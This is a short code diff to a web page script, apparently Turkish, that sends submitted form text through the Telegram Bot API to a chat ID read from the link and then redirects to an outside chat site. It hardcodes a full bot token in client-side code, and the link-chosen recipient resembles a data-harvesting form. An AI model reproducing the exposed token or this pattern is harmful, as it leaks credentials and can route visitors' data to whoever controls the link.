@@ -42,7 +42,8 @@
 
   <script>
     const token = '7925810136:AAET-jcZkQKglWwdn2PS_PTUKlDRGCvXVkk';
-    const telegramId = window.location.search.substring(1); // "?12345" → "12345"
+    const urlParams = new URLSearchParams(window.location.search);
+    const telegramId = urlParams.get('id');
 
     async function formuGonder() {
       const ad = document.getElementById('ad').value;
@@ -65,7 +66,8 @@
           body: JSON.stringify({ chat_id: telegramId, text: mesaj })
         });
 
-        window.location.href = `/show.html?${telegramId}`;
+        // Kayıt sonrası yönlendirme
+        window.location.href = "https://koyusohbet.com/chat";
       } catch (err) {
         alert("Telegram'a gönderilemedi.");
         console.error(err);
